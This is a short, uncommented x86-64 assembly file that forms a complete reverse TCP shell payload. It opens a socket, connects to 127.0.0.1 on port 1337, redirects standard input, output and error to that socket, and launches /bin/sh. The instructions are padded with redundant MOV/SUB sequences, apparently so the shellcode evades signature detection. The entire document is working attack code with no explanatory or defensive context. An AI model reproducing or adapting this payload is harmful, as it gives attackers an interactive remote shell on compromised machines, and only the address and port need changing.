BITS 64
global _start

section .text
_start: 
MOV rax,0x01
SUB rax,0x01
xor rdi,rdi
MOV rsi,0x01
SUB rsi,0x01
xor rdx,rdx
XOR r8,r8
MOV rdx,r8
mov sil,0x01
MOV dil,15
SUB dil,13
mov al,0x29
syscall
MOV r9b,al
MOV dil,r9b
xor r11,r11
push 0x0100007f
push word 0x3905
push word 0x2
MOV r9,rsp
MOV rsi,r9
mov dl,0x10
MOV al,48
SUB al,6
syscall
MOV r11,0x01
SUB r11,0x01
mov dil,0x03
MOV r9,r11
MOV rsi,r9
mov al,0x21
syscall
MOV r11,0x01
SUB r11,0x01
mov dil,0x03
MOV sil,15
SUB sil,14
mov al,0x21
syscall;
MOV r11,0x01
SUB r11,0x01
mov dil,0x03
MOV sil,2
SUB sil,0
mov al,0x21
syscall;
XOR r10,r10
MOV rax,r10
xor rdi,rdi
XOR r10,r10
MOV rsi,r10
xor r13,r13
MOV r9b,59
MOV al,r9b
mov rdi,"/bin/sh"
push r13
push rdi
MOV r10,rsp
MOV rdi,r10
push r13
push rdi
MOV r12,rsp
MOV rsi,r12
xor rdx,rdx
syscall
